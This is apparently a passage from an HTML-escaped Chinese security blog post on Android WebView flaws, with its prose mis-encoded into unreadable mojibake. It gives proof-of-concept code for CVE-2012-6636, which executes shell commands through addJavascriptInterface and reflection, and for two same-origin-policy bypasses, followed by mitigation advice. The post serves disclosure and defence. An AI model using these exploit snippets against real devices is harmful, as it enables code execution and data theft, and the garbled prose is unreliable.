&lt;span class=&quot;n&quot;&gt;webView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadUrl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.example.com/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;â€¦
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
       &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;injectedObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// return &quot;Hello World&quot;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;â€¦&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;åƒä¸Šé¢çš„ä¾‹å­è£¡ï¼Œç¶²é èƒ½é€šéé å…ˆè¨­å®šå¥½çš„ â€œinjectedObjectâ€ ä»‹é¢ï¼Œå‘¼å« â€œtoStringâ€ å‡½å¼ï¼Œå¾—åˆ° â€œHello Worldâ€ é€™å€‹å­—ä¸²ã€‚&lt;/p&gt;

&lt;p&gt;å…¶æ¼æ´ &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-6636&quot;&gt;CVE-2012-6636&lt;/a&gt; æœ€æ—©åœ¨2012å¹´12æœˆè¢«&lt;a href=&quot;http://50.56.33.56/blog/?p=314&quot;&gt;å…¬ä½ˆ&lt;/a&gt;å‡ºä¾†ï¼Œæ”»æ“Šè€…æœ‰æ©Ÿæœƒåˆ©ç”¨ä»–é€šé Java Reflection API ä¾†åŸ·è¡Œä»»æ„ä»£ç¢¼ã€‚å½±éŸ¿ Android 1.X ~ 4.1ã€‚&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmdArgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;injectedObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;java.lang.Runtime&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                              &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                              &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmdArgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/system/bin/sh&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cat vuln &amp;gt;&amp;gt; attacker.txt&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;å…¶å¾Œ Google åœ¨ Android 4.2 é–‹å§‹å° &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; çš„ä½¿ç”¨æ–¹å¼åŠ äº†é™åˆ¶ï¼Œä½¿ç”¨æ™‚éœ€è¦åœ¨ Java ç«¯æŠŠå¯è¢«ç¶²é åŸ·è¡Œçš„å…¬é–‹å‡½å¼é€é @JavascriptInterface ä¾†æ¨™è¨»ã€‚ä¸¦å¥‰å‹¸é–‹ç™¼è€…åˆ¥åœ¨ 4.1 æˆ–ä¹‹å‰çš„ç³»çµ±ä¸Šä½¿ç”¨ &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;p&gt;å¯æ˜¯æ˜¯å¦é–‹ç™¼è€…åªè¦åœ¨å—å½±éŸ¿çš„ç³»çµ±ä¸Šä¸ä¸»å‹•ä½¿ç”¨ &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; å°±èƒ½è§£æ±ºå•é¡Œå‘¢ï¼Ÿç­”æ¡ˆæ˜¯å¦å®šçš„ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨ Android 3.X ~ 4.1 ä¸Šï¼ŒWebView é è¨­æœƒç”¨ &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; æ·»åŠ ä¸€å€‹å« â€œsearchBoxJavaBridge_â€ çš„ä»‹é¢ã€‚é–‹ç™¼è€…å¦‚æœæ²’æœ‰æ³¨æ„çš„è©±å°±æœƒåŒæ¨£æœƒè®“ä½¿ç”¨è€…é™·å…¥é¢¨éšªä¸­ã€‚å¾ˆå·§åˆåœ°ï¼Œå¾ Android 3.0 é–‹å§‹ Google åŠ å…¥äº† &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#removeJavascriptInterface(java.lang.String)&quot;&gt;removeJavascriptInterface&lt;/a&gt; å‡½å¼è®“é–‹ç™¼è€…å¯ä»¥ç§»å®šæŒ‡å®šçš„ä»‹é¢ã€‚æ‰€ä»¥é–‹ç™¼è€…å¯ä»¥ä½¿ç”¨è©²å‡½å¼åœ¨å—å½±éŸ¿çš„ç³»çµ±ä¸ŠæŠŠ â€œsearchBoxJavaBridge_â€ ç§»é™¤ã€‚&lt;/p&gt;

&lt;p&gt;é™¤äº† â€œsearchBoxJavaBridge_â€ å¤–ï¼Œé‚„æœ‰å…©å€‹ä»‹é¢æœƒåœ¨ç‰¹å®šæƒ…æ³ä¸‹è¢«åŠ åˆ° WebView ä¸­ã€‚è‹¥ä½¿ç”¨è€…æœ‰åœ¨æ‰‹æ©Ÿä¸Š [ç³»çµ±è¨­å®š] è£¡çš„ [å”åŠ©å·¥å…·]ï¼Œæ‰“é–‹ [æœå‹™] å­åˆ†é¡ä¸­çš„ä»»ä½•ä¸€å€‹é …ç›®ï¼Œç³»çµ±å°±æœƒå°å…¶å¾Œå»ºç«‹çš„ WebView è‡ªå‹•åŠ ä¸Š â€œaccessibilityâ€ å’Œ â€œaccessibilityTraversalâ€é€™å…©å€‹ä»‹é¢ã€‚é€™è¡Œç‚ºåœ¨ Android 4.4 ç”±æ–¼&lt;a href=&quot;https://android.googlesource.com/platform/frameworks/base/+/94c0057d67c2e0a4b88a4f735388639210260d0e&quot;&gt;èˆŠç‰ˆ WebView è¢«å–ä»£&lt;/a&gt;è€Œæ¶ˆå¤±äº†ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20141013/android_accessibility_service.png&quot; alt=&quot;Android å”åŠ©å·¥å…·æœå‹™&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;é˜²ç¯„&quot;&gt;é˜²ç¯„&lt;/h4&gt;

&lt;p&gt;ä½œç‚ºé–‹ç™¼è€…&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å¦‚ééœ€è¦ï¼Œé—œé–‰ JavaScript åŠŸèƒ½ (é è¨­é—œé–‰)&lt;/li&gt;
  &lt;li&gt;å¯è€ƒæ…®æŠŠç¶²é ç•¶ä½œç¯„æœ¬å„²å­˜åœ¨æ‡‰ç”¨å…§ï¼Œå†ç”¨å…¶ä»–é€”å¾‘è¼‰å…¥è³‡æ–™&lt;/li&gt;
  &lt;li&gt;åœ¨æœ‰é¢¨éšªçš„ç³»çµ±ä¸­åœç”¨ &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;åœ¨æœ‰é¢¨éšªçš„ç³»çµ±ä¸­ä½¿ç”¨ &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#removeJavascriptInterface(java.lang.String)&quot;&gt;removeJavascriptInterface&lt;/a&gt; ç§»é™¤ç³»çµ±è‡ªå¸¶çš„ä»‹é¢&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä½œç‚ºä½¿ç”¨è€…&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å¦‚ééœ€è¦ï¼Œé—œé–‰ [ä¸æ˜çš„ä¾†æº] é¸é … (é è¨­é—œé–‰)&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨ Android 4.2 æˆ–ä»¥ä¸Šä¸å—å½±éŸ¿çš„ç³»çµ±&lt;/li&gt;
  &lt;li&gt;å‹¿åœ¨å—å½±éŸ¿çš„ç³»çµ±ä¸Šä½¿ç”¨æ©Ÿæ•æœå‹™æˆ–å„²å­˜æ©Ÿæ•è³‡æ–™&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20141013/android_unknown_source.png&quot; alt=&quot;Android ä¸æ˜çš„ä¾†æº&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;2-ç¹éåŒæºç­–ç•¥-same-origin-policy-bypass&quot;&gt;2. ç¹éåŒæºç­–ç•¥ (Same-Origin Policy bypass)&lt;/h4&gt;

&lt;h5 id=&quot;é¢¨éšªå€‹è³‡è¢«ç›œ&quot;&gt;é¢¨éšªï¼šå€‹è³‡è¢«ç›œ&lt;/h5&gt;
&lt;p&gt;ç‚ºé˜²æ­¢ç¶²é åœ¨è¼‰å…¥å¤–éƒ¨è³‡æºæ™‚å¼•ç™¼å®‰å…¨å•é¡Œï¼Œç€è¦½å™¨æœƒå¯¦ä½œ&lt;a href=&quot;https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Same_origin_policy_for_JavaScript&quot;&gt;åŒæºç­–ç•¥&lt;/a&gt;ä»¥é™åˆ¶ç¨‹å¼ç¢¼å’Œä¸åŒç¶²åŸŸè³‡æºé–“çš„äº’å‹•ã€‚&lt;/p&gt;

&lt;p&gt;å…¶ä¸­ &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6041&quot;&gt;CVE-2014-6041&lt;/a&gt; æ¼æ´ï¼Œé€šéç¨‹å¼åœ¨è™•ç† \u0000 (unicode null byte) æ™‚çš„å¤±èª¤è€Œç¹éäº†åŸæœ‰çš„é™åˆ¶ã€‚&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;CVE-2014-6041 UXSS DEMO&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;target_frame&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://devco.re/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;button&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;go&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onclick=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;window.open(&apos;\u0000javascript:alert(document.domain)&apos;,
&apos;target_frame&apos;)&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;å¦‚æœä¸Šé¢çš„ç¶²é æ˜¯æ”¾ç½®åœ¨èˆ‡ &lt;a href=&quot;http://devco.re/&quot;&gt;http://devco.re/&lt;/a&gt; ä¸åŒæºçš„åœ°æ–¹ï¼Œæ­£å¸¸ä¾†èªªé»æ“ŠæŒ‰éˆ•å¾Œæœƒå› ç‚º SOP çš„é—œä¿‚ï¼Œè©²æ®µ JavaScript ç„¡æ³•åŸ·è¡Œè€Œä¸æœƒæœ‰åæ‡‰ã€‚ä½†åœ¨å—å½±éŸ¿çš„ç’°å¢ƒè£¡å‰‡èƒ½é †åˆ©åŸ·è¡Œä¸¦è·³å‡º â€œdevco.reâ€ é€™å€‹ç¶²åŸŸåç¨±ã€‚&lt;/p&gt;

&lt;p&gt;ä¸Šè¿°å•é¡Œè¢«ç™¼ç¾å¾Œæ²’å¤šä¹…ï¼Œå†ç”±ç›¸åŒç ”ç©¶å“¡ç™¼ç¾ä¸€å€‹æ—©åœ¨å¤šå¹´å‰å·²ç¶“è¢«ä¿®æ­£çš„ &lt;a href=&quot;http://trac.webkit.org/changeset/96826&quot;&gt;WebKit è‡­èŸ²&lt;/a&gt;ä»ç„¶å‡ºç¾åœ¨ Android 4.3 åŠä¹‹å‰çš„ç‰ˆæœ¬ä¸Šã€‚&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://www.bing.com&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;javascript:alert(document.domain)&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;foobar&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ä¸Šè¿°çš„è·¨ä¾†æºæ“ä½œåŒæ¨£é•åäº† SOPï¼Œæ‡‰ç•¶è¢«æ‹’çµ•åŸ·è¡Œã€‚ä½†ä»–å»èƒ½åœ¨æœ‰é¢¨éšªçš„ WebView ä¸Šè¢«åŸ·è¡Œï¼Œé€ æˆé¢¨éšªã€‚&lt;/p&gt;

&lt;h4 id=&quot;é˜²ç¯„-1&quot;&gt;é˜²ç¯„&lt;/h4&gt;

&lt;p&gt;ä½œç‚ºé–‹ç™¼è€…&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å¦‚ééœ€è¦ï¼Œé—œé–‰ JavaScript åŠŸèƒ½ (é è¨­é—œé–‰)&lt;/li&gt;
  &lt;li&gt;å¯è€ƒæ…®æŠŠç¶²é ç•¶ä½œç¯„æœ¬å„²å­˜åœ¨æ‡‰ç”¨å…§ï¼Œå†ç”¨å…¶ä»–é€”å¾‘è¼‰å…¥è³‡æ–™&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä½œç‚ºä½¿ç”¨è€…&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å¦‚ééœ€è¦ï¼Œé—œé–‰ [ä¸æ˜çš„ä¾†æº] é¸é … (é è¨­é—œé–‰)&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨ Android 4.4 æˆ–ä»¥ä¸Šä¸å—å½±éŸ¿çš„ç³»çµ±&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;çµèª&quot;&gt;çµèª&lt;/h3&gt;

&lt;p&gt;è«‡åˆ°é€™è£¡å¤§å®¶å¯èƒ½æœƒæœ‰å€‹ç–‘å•ï¼Œå¦‚æœæ‡‰ç”¨ç¨‹å¼ä¸­æ‰€è¼‰å…¥çš„é ç«¯ç¶²é ç¶²å€éƒ½æ˜¯å›ºå®šï¼Œå—é–‹ç™¼è€…æ§åˆ¶çš„ï¼Œæ‡‰è©²å°±æœƒå®‰å…¨æ²’æœ‰é¢¨éšªã€‚é‚„è¨˜å¾—åœ¨ &lt;a href=&quot;http://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development/&quot;&gt;è¢«å¿½ç•¥çš„ SSL è™•ç†&lt;/a&gt; è£¡æåŠéçš„ä¸­é–“äººæ”»æ“Šå—ï¼Ÿå¦‚æœé€£ç·šéç¨‹æ˜¯æ¡ç”¨æ˜æ–‡çš„ HTTP ï¼Œæˆ–æ˜¯åŠ å¯†çš„ HTTPS ä½†æ²’è½å¯¦åšå¥½æ†‘è­‰æª¢æŸ¥ï¼Œå…§å®¹å°±æœ‰æ©Ÿæœƒè¢«æ”»æ“Šè€…ç«Šå–ä¿®æ”¹ï¼Œå†çµåˆä¸Šé¢æåˆ°çš„æ¼æ´ï¼Œå°ä½¿ç”¨è€…å¸¶ä¾†çš„å½±éŸ¿å‰‡å¤§å¤§å¢åŠ ã€‚&lt;/p&gt;

&lt;p&gt;ä¸‹é¢æˆ‘å€‘è£½ä½œäº†ä¸€æ®µçµåˆä¸­é–“äººæ”»æ“Šèˆ‡ addJavascriptInterface æ¼æ´ï¼Œæ¨¡æ“¬ä½¿ç”¨è€…æ‰‹æ©Ÿè¢«å…¥ä¾µçš„å½±ç‰‡ï¼š&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/reKEu-Ajo50&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;å¾å½±ç‰‡çš„æœ€å¾Œå¯ä»¥çœ‹åˆ°ï¼Œæ”»æ“Šè€…å–å¾—å­˜åœ¨æ¼æ´çš„æ‡‰ç”¨ç¨‹å¼æ¬Šé™ï¼Œä¸¦å–å¾—è£¡é¢çš„æ©Ÿæ•è³‡æ–™ã€‚&lt;/p&gt;

&lt;p&gt;è€Œåœ¨ç¹éåŒæºç­–ç•¥å•é¡Œä¸Šï¼Œç„¡è«–æ˜¯é€é null byte æˆ–æ˜¯è¨­å®šå±¬æ€§ä¾†é”åˆ°ï¼Œå…¶å¯¦éƒ½æ˜¯å±¬æ–¼å­˜åœ¨å·²ä¹…çš„æ‰‹æ³•ï¼Œå¤šå¹´å‰åœ¨åˆ¥çš„å¹³å°ã€ç€è¦½å™¨ä¸Šå°±å·²ç¶“ç™¼ç”Ÿéï¼Œé™¤äº†ç·¨å¯«ä¸Šçš„ç–å¿½å¤–ï¼Œç¼ºä¹ä¸€å€‹å®Œæ•´çš„æ¸¬è©¦æµç¨‹å»åšæª¢æŸ¥ç›¸ä¿¡ä¹Ÿæ˜¯å…¶ä¸­ä¸€å€‹åŸå› ã€‚&lt;/p&gt;

&lt;p&gt;Android çš„ç”Ÿæ…‹ç³»çµ±å•é¡Œï¼Œä½¿å¾—å¤§å¤šæ•¸çš„ä½¿ç”¨è€…æ‰‹æ©Ÿæœªèƒ½è·Ÿå¾—ä¸Šç³»çµ±æ›´æ–°çš„æ­¥é©Ÿï¼Œè®“ä»–å€‘å³ä½¿çŸ¥é“è‡ªå·±æ‰€ä½¿ç”¨ç³»çµ±å­˜åœ¨å•é¡Œä¹Ÿæ„›è«èƒ½åŠ©ã€‚&lt;/p&gt;

&lt;p&gt;ä½œç‚ºé–‹ç™¼å•†ï¼Œæ‡‰éœ€è¦åœ¨ç³»çµ±æ”¯æ´åº¦èˆ‡å…¶ç›¸æ‡‰å­˜åœ¨çš„å®‰å…¨é¢¨éšªä¸­å–å¾—å¹³è¡¡ï¼Œä¾†æ±ºå®šæ‡‰ç”¨ç¨‹å¼æ‰€æ”¯æ´çš„æœ€ä½ç‰ˆæœ¬ç‚ºä½•ã€‚æœ€å¾Œä½œç‚ºä¸€å€‹è² è²¬ä»»çš„é–‹ç™¼è€…ï¼Œæ‡‰ç‚ºå·²è¢«å…¬é–‹çš„æ¼æ´åšå¥½æ‡‰å°æªæ–½ï¼Œé¿å…ä½¿ç”¨è€…æš´éœ²åœ¨é¢¨éšªç•¶ä¸­ã€‚&lt;/p&gt;

&lt;h3 id=&quot;åƒè€ƒ&quot;&gt;åƒè€ƒ&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://50.56.33.56/blog/?p=314&quot;&gt;Abusing WebView JavaScript Bridges&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.rafayhackingarticles.net/2014/08/android-browser-same-origin-policy.html&quot;&gt;Android Browser Same Origin Policy Bypass &amp;lt; 4.4 - CVE-2014-6041&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html&quot;&gt;A Tale Of Another SOP Bypass In Android Browser &amp;lt; 4.4&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
